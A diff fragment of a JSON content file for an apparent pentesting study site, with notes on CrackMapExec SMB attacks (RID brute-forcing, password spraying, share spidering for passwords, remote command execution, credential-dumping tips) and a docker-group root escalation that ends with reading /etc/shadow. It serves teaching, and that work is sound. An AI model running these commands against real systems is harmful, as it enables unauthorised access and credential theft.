+        "code": "crackmapexec smb 10.10.10.10 -u '' -p '' --rid-brute"
+      },
+      {
+        "type": "order_block",
+        "id": "cme-rid-analysis",
+        "text": "When you have no usernames, use <highlight>--rid-brute</highlight> to query the SAM database via RPC. It iterates through Relative Identifiers (RIDs) to extract a full list of valid local or domain users from the target."
+      },
+      {
+        "type": "section_heading",
+        "id": "cme-pass-spray",
+        "text": "Password Spraying & Authentication"
+      },
+      {
+        "type": "code_block",
+        "id": "cme-spray-cmd",
+        "language": "bash",
+        "code": "crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success"
+      },
+      {
+        "type": "order_block",
+        "id": "cme-spray-analysis",
+        "text": "Use a list of discovered usernames to test a single common password. The <highlight>--continue-on-success</highlight> flag ensures the tool doesn't stop after the first valid credential, allowing you to map all compromised accounts."
+      },
+      {
+        "type": "section_heading",
+        "id": "cme-advanced-spider",
+        "text": "Automated Content Spidering"
+      },
+      {
+        "type": "code_block",
+        "id": "cme-spider-cmd",
+        "language": "bash",
+        "code": "crackmapexec smb 10.10.10.10 -u 'guest' -p '' --spider 'backups' --regex 'pass|user|config'"
+      },
+      {
+        "type": "order_block",
+        "id": "cme-spider-analysis",
+        "text": "The <highlight>--spider</highlight> flag allows you to search a specific share for interesting files. Using <highlight>--regex</highlight> filters the results for filenames containing 'pass', 'user', or 'config', making it easy to find high-value targets quickly."
+      },
+      {
+        "type": "section_heading",
+        "id": "cme-exec",
+        "text": "Command Execution (Requires Admin)"
+      },
+      {
+        "type": "code_block",
+        "id": "cme-exec-cmd",
+        "language": "bash",
+        "code": "crackmapexec smb 10.10.10.10 -u 'admin' -p 'P@ssword!' -x 'whoami /priv'"
+      },
+      {
+        "type": "order_block",
+        "id": "cme-exec-analysis",
+        "text": "If you have administrative credentials, the <highlight>-x</highlight> flag executes commands on the target system. This is often used to check for high privileges or to disable security features."
+      },
+      {
+        "type": "explanation",
+        "id": "cme-power-tips",
+        "title": "CME Power User Tips",
+        "items": [
+          "Use --pass-pol to check the domain password lockout policy before spraying",
+          "Check for --sam or --lsa to dump credentials if you have local admin rights",
+          "Use --groups to see which users belong to 'Domain Admins'",
+          "Use --local-auth if you are targeting a local account rather than a domain account"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 52,
+    "slug": "docker-group",
+    "title": "Docker Groups",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/docker/groups.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "docker-priv-esc-intro",
+        "text": "Phase 2: Privilege Escalation via Docker Group"
+      },
+      {
+        "type": "order_block",
+        "id": "docker-logic",
+        "text": "Membership in the <highlight>docker</highlight> group is a critical security misconfiguration. Since the Docker daemon runs with <highlight>root</highlight> privileges, any user in this group can interact with the daemon to mount the entire host filesystem into a container, effectively bypassing all OS-level permission controls."
+      },
+      {
+        "type": "section_heading",
+        "id": "docker-discovery",
+        "text": "Step 1: Identifying Group Membership"
+      },
+      {
+        "type": "order_block",
+        "id": "id-command-logic",
+        "text": "We use the <highlight>id</highlight> or <highlight>groups</highlight> command to check if the current user has permissions to interact with the Docker socket. If 'docker' appears in the output, the escalation path is confirmed."
+      },
+      {
+        "type": "code_block",
+        "id": "check-groups-command",
+        "language": "bash",
+        "code": "# Check current user groups\nid\n# or\ngroups"
+      },
+      {
+        "type": "output_block",
+        "id": "docker-group-output",
+        "language": "text",
+        "code": "uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)"
+      },
+      {
+        "type": "section_heading",
+        "id": "docker-exploitation",
+        "text": "Step 2: Mounting the Host Filesystem"
+      },
+      {
+        "type": "order_block",
+        "id": "mount-logic",
+        "text": "We run a container and use the <highlight>-v /:/mnt</highlight> flag to mount the host's root directory into the container's <highlight>/mnt</highlight> folder. By using <highlight>chroot</highlight>, we shift our shell's root to this mount point, giving us full access to the host as root."
+      },
+      {
+        "type": "code_block",
+        "id": "docker-root-shell",
+        "language": "bash",
+        "code": "# Escape to host root via Docker container\ndocker run -v /:/mnt -it bash chroot /mnt sh"
+      },
+      {
+        "type": "section_heading",
+        "id": "docker-verification",
+        "text": "Step 3: Post-Exploitation & Data Recovery"
+      },
+      {
+        "type": "order_block",
+        "id": "root-access-check",
+        "text": "Once the container starts, we are operating with <highlight>UID 0</highlight>. We can now access protected files like <highlight>/etc/shadow</highlight> or private files in the root home directory."
+      },
+      {
+        "type": "code_block",
+        "id": "root-file-access",
+        "language": "bash",
+        "code": "# Confirm root and capture flag\nwhoami\ncat /root/private.txt\ncat /etc/shadow"
+      },
+      {
+        "type": "explanation",
+        "id": "docker-exploit-summary",
+        "title": "Exploit Takeaways",
+        "items": [
+          "Vulnerability: Insecure group assignment (Non-admin user in docker group)",
+          "Discovery: Always check group memberships during local enumeration",
+          "Technique: Filesystem mounting allows complete bypass of host-based access controls",
+          "Defense: Limit docker group access; use the Docker socket only via sudo or root"
         ]
       }
     ]
